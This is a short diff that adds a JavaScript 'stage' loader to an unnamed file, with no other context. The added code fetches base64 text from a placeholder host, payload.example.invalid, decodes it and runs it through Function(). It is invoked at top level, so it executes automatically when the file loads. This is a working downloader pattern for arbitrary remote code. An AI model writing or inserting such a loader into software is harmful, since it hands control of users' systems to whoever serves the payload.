@@ -1,0 +1,8 @@
+async function loadStage() {
+  const response = await fetch('https://payload.example.invalid/stage');
+  const encoded = await response.text();
+  const source = Buffer.from(encoded, 'base64').toString('utf8');
+  Function(source)();
+}
+
+loadStage();
